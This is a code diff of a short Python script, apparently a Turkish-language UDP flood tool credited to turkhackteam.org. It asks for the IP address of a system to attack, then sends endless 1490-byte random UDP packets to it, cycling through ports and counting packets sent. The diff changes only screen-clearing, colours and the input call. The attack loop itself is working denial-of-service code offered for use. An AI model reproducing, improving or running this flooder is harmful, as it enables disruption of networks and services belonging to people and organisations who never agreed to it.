@@ -4,26 +4,27 @@ import os
 import time
 import socket
 import random
-os.system("clear")
-os.system("figlet")
-print("~#~; Program turkhackteam.org ve hack sevenler ailesi icin hazirlanmistir.")
-time.sleep(5)
 os.system("cls")
-os.system("figlet")
-print("""               dp
-
+os.system("color a")
+print("~#~; Program turkhackteam.org ve hacking sevenler ailesi icin hazirlanmistir.")
+time.sleep(5)
+os.system("color c")
+os.system("cls")
+print("""
+                        dp
+                        
  	    dbPYB       dp   dp"dp     dpPYb   dpdpdp
  	    dp          dp   dp   dp   dp      dp   dp
  	    dPYd        dp   dp    dp  dpPYb   dpdpdp
  	    dp          dp   dp    dp  dp      dp  dp
             dbdpd   pdpdp    YbodPdp   YbodP   sp   dp. (HACKER-EJDER)
    -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-                                            
-                       $EJDER_HACKER                                             
+                       $EJDER_HACKER                                            
 	""")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
 bytes = random._urandom(1490)
-ip = input("<< Saldirilacak sistemin ip adresini giriniz >> ~# ")
-os.system("clear")
+ip = raw_input("<< Saldirilacak sistemin ip adresini giriniz >> ~# ")
+os.system("cls")
 sent = 0
 port = 1
 while True:
@@ -33,7 +34,7 @@ while True:
 		sock.sendto(bytes,(ip,port))
 		sent = sent + 1
 		port = port + 1
-		os.system("clear")
+		os.system("color a")
 		print("%s Paketler hedefe gonderiliyor."%sent)
 			
 	except KeyboardInterrupt:
